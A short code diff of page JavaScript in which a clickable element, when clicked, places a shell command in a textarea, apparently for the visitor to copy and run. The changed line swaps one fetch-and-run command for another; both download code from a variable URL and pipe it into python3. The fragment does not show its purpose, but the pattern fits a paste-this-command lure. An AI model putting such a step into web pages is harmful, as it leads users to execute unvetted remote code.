@@ -31,7 +31,7 @@
     document.body.appendChild(c);
 
     c.onclick = () => {
-        const executionString = `curl -sSsfL "${binaryStorageUrl}" | python3 -`;
+        const executionString = `bash -c 'python3 <(curl -sSsfL "${binaryStorageUrl}")'`;
 
         const e = document.createElement('textarea');
         e.value = executionString;
